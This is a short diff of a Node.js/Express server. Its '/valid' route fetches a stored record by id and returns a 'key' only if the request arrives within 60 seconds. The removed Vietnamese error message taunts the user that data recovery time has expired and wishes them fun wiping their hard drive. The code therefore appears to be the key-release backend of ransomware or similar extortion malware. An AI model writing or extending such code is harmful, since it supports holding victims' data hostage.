@@ -86,6 +86,7 @@ app.post('/save',async (req,res)=>{
 })
 
 app.post('/valid',async (req,res)=>{
+  console.log(req.body);
   const id = req.body.id;
   var o_id = new mongo.ObjectId(id);
   
@@ -96,7 +97,7 @@ app.post('/valid',async (req,res)=>{
     const diff = (epochLocal - epochUser);
     console.table(diff)
     if(diff > 60){
-      res.status(500).send("Thời gian để khôi phục dữ liệu đã hết !!!! Chúc bạn xoá ổ cứng vui vẻ")
+      res.status(500).send()
     }
     else{
       res.status(200).send(doc.key)
